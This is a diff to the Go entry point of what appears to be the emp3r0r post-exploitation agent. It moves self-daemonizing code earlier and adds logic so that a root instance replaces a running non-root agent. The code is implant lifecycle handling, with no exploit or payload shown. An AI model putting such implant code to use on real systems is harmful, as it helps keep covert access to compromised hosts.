@@ -51,6 +51,25 @@ func main() {
 		}
 	}
 
+	// daemonize
+	if *daemon {
+		args := os.Args[1:]
+		i := 0
+		for ; i < len(args); i++ {
+			if args[i] == "-daemon=true" || args[i] == "-daemon" {
+				args[i] = "-daemon=false"
+				break
+			}
+		}
+		cmd := exec.Command(os.Args[0], args...)
+		err := cmd.Start()
+		if err != nil {
+			log.Fatal(err)
+		}
+		log.Printf("%s is starting in background wit PID %d...", os.Args[0], cmd.Process.Pid)
+		os.Exit(0)
+	}
+
 	// if the agent's process name is not "emp3r0r"
 	alive, pid := agent.IsAgentRunningPID()
 	if alive {
@@ -61,7 +80,11 @@ func main() {
 
 		// exit, leave the existing agent instance running
 		if agent.IsAgentAlive() {
-			log.Fatal("Agent is already running and responsive, aborting")
+			if os.Geteuid() == 0 && agent.ProcUID(pid) != "0" {
+				log.Println("Escalating privilege...")
+			} else {
+				log.Fatal("Agent is already running and responsive, aborting")
+			}
 		}
 
 		// if agent is not responsive, kill it, and start a new instance
@@ -73,24 +96,6 @@ func main() {
 
 	// start socket listener
 	go socketListen()
-
-	// daemonize
-	if *daemon {
-		args := os.Args[1:]
-		i := 0
-		for ; i < len(args); i++ {
-			if args[i] == "-daemon=true" {
-				args[i] = "-daemon=false"
-				break
-			}
-		}
-		cmd := exec.Command(os.Args[0], args...)
-		err := cmd.Start()
-		if err != nil {
-			log.Fatal(err)
-		}
-		os.Exit(0)
-	}
 
 	// do we have internet?
 	if tun.HasInternetAccess() {
